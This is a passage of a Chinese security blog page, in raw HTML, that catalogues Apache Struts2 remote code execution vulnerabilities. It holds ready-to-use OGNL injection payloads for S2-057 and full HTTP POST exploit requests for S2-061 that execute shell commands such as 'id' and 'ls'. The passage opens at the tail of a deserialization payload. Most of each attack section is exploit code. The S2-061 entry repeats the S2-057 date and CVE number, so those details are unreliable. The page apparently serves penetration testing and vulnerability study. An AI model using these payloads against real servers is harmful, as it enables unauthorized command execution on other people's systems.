class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
<ul>
<li><p>脚本测试结果</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/9.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200618162025032" class="fancybox"><img alt="image-20200618162025032" title="image-20200618162025032" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/9.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x10-Struts2远程命令执行漏洞-s2-057"><a href="#0x10-Struts2远程命令执行漏洞-s2-057" class="headerlink" title="0x10 Struts2远程命令执行漏洞(s2-057)"></a>0x10 Struts2远程命令执行漏洞(s2-057)</h4><h5 id="漏洞详情-9"><a href="#漏洞详情-9" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018-8-22</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-11776</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.3.20和2.3.34版本</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞是由于在Struts2开发框架中使用namespace功能定义XML配置时，namespace值未被设置且在上层动作配置（ActionConfiguration）中未设置或用通配符namespace，可能导致远程代码执行</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-9"><a href="#请求方式-9" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-9"><a href="#POC-9" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，在文件目录中间放置POC才行，使用方法<code>http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action</code></p>
<p>2.3.34版本的POC</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>2.3.20版本的POC</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&#x2F;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>脚本测试</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/10.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200618180408298" class="fancybox"><img alt="image-20200618180408298" title="image-20200618180408298" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/10.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x11-Struts2远程命令执行漏洞-s2-061"><a href="#0x11-Struts2远程命令执行漏洞-s2-061" class="headerlink" title="0x11 Struts2远程命令执行漏洞(s2-061)"></a>0x11 Struts2远程命令执行漏洞(s2-061)</h4><h5 id="漏洞详情-10"><a href="#漏洞详情-10" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018-8-22</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-11776</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts 2.0.0 - Struts 2.5.25</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类org.apache.commons.collections.BeanMap在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，如果没有使用这个依赖包，也还是没办法进行利用</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-10"><a href="#请求方式-10" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-10"><a href="#POC-10" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>EXP1（验证漏洞是否存在）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;you_ip:8080&#x2F;?id&#x3D;%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d</span><br></pre></td></tr></table></figure></div>

<p>如果返回值中存在test2020就存在漏洞</p>
</li>
</ul>
<ul>
<li><p>EXP2（第一种利用方式执行命令ls）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: ybdt.best:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101 Firefox&#x2F;83.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>EXP3（第二种利用方式执行命令id）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: ybdt.best:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.110:8080&#x2F;index.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 1361</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line">(#request.map&#x3D;#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + </span><br><span class="line">(#request.map.setBean(#request.get(&#39;struts.valueStack&#39;)) &#x3D;&#x3D; true).toString().substring(0,0) + </span><br><span class="line">(#request.map2&#x3D;#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) +</span><br><span class="line">(#request.map2.setBean(#request.get(&#39;map&#39;).get(&#39;context&#39;)) &#x3D;&#x3D; true).toString().substring(0,0) + </span><br><span class="line">(#request.map3&#x3D;#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + </span><br><span class="line">(#request.map3.setBean(#request.get(&#39;map2&#39;).get(&#39;memberAccess&#39;)) &#x3D;&#x3D; true).toString().substring(0,0) + </span><br><span class="line">(#request.get(&#39;map3&#39;).put(&#39;excludedPackageNames&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) &#x3D;&#x3D; true).toString().substring(0,0) + </span><br><span class="line">(#request.get(&#39;map3&#39;).put(&#39;excludedClasses&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) &#x3D;&#x3D; true).toString().substring(0,0) +</span><br><span class="line">(#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;freemarker.template.utility.Execute&#39;).exec(&#123;&#39;id&#39;&#125;))</span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/1899/11/30/Cms/Struts2/">https://www.ascotbe.com/1899/11/30/Cms/Struts2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/102.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/1899/11/30/Cms/Solr/"><img class="prev_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/95.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>Solr</span></div></a></div><div class="next-post pull_right"><a href="/1899/11/30/Cms/Tomcat/"><img class="next_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/83.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Tomcat</span></div></a></div></nav></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By ascotbe</div><span>呐呐呐ฅ(๑*д*๑)ฅ到底啦~</span><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>闽ICP备20002178号-1</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/click_heart.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-110,"vOffset":-40},"mobile":{"show":false},"log":false});</script></body></html>